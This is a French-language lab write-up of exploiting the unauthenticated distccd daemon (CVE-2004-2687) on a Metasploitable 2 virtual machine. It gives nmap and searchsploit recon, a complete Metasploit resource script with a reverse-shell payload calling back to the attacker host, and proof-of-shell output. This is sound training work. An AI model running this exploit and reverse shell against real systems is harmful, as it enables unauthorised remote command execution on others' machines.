# Write-up — distccd Command Execution (Metasploitable 2, port 3632)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali/LHOST : `192.168.56.1`.
CVE-2004-2687 · Résultat : **shell `daemon`** (uid=1). Pas root directement, mais accès
système obtenu — point de départ possible pour une élévation de privilèges.

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`
> (DHCP, MAC `08:00:27:0A:71:3F`).

**C'est quoi ?** distcc (compilation distribuée) répartit la compilation de code sur
plusieurs machines. Le démon `distccd` **ne vérifie pas qui lui parle** : si on l'expose sur
le réseau sans restriction, n'importe qui peut lui faire exécuter des commandes arbitraires.

---

## 1. Recon

```bash
nmap -sV -p 3632 192.168.56.101
```
```
PORT     STATE SERVICE VERSION
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

Le démon est ouvert et répond sans filtrage. Contrairement à MS1 (où `distccd` était protégé
par une ACL `--allow` restrictive qu'il fallait diagnostiquer), ici il est grand ouvert —
exploitation directe.

## 2. Méthode d'identification de la CVE et du module

```bash
searchsploit distcc
```
```
DistCC Daemon - Command Execution (Metasploit)   | multiple/remote/9915.rb
```

Une exécution de commande connue existe. Chemin du module dans `msfconsole` :

```bash
msfconsole -q -x "search distcc; exit"
```
```
0  exploit/unix/misc/distcc_exec  2002-02-01  excellent  Yes  DistCC Daemon Command Execution
```

CVE et mécanisme :
```bash
msfconsole -q -x "info exploit/unix/misc/distcc_exec; exit"
```
```
References:
  https://nvd.nist.gov/vuln/detail/CVE-2004-2687
```

**CVE-2004-2687.** distccd, mal configuré (exposé sans restreindre les clients autorisés),
exécute les commandes de compilation qu'on lui envoie — ce qui permet d'y glisser une commande
shell arbitraire. Ce n'est pas une faille de code mais une **mauvaise configuration par
défaut** laissée exploitable.

## 3. Exploiter

🖥 Kali — via resource script :
```bash
cat > /tmp/distcc.rc << 'EOF'
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.56.101
set RPORT 3632
set LHOST 192.168.56.1
set LPORT 4445
set payload cmd/unix/reverse
run -z
sessions -c "id; uname -a; hostname; whoami" -i 1
exit -y
EOF
msfconsole -q -r /tmp/distcc.rc
```

Résultat :
```
[*] Command shell session 1 opened (192.168.56.1:4445 -> 192.168.56.101:56190)
```

**Note :** `LHOST`/`LPORT` nécessaires — `cmd/unix/reverse` est un payload reverse (il ouvre
en fait **deux** connexions retour vers Kali, d'où deux sockets ESTABLISHED sur le port 4445,
c'est le fonctionnement normal du « double reverse » shell, pas un bug).

## 4. Preuve d'accès

```
[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
daemon
```

→ Shell **`daemon`** (uid=1), pas root : le démon distccd tourne sous ce compte de service,
donc la commande injectée hérite de ses droits. On est **entré sur la machine** — à partir de
là on pourrait chercher une élévation de privilèges (noyau 2.6.24 ancien, fichiers
world-writable, SUID…). Comparaison instructive avec MS1 : même CVE, mais là-bas l'ACL
`--allow` bloquait l'accès réseau — ici la config ouverte rend l'attaque immédiate.

---

**Pour rejouer :** `./start.sh`, localiser l'IP (`nmap -sn 192.168.56.0/24`), puis l'étape 3.
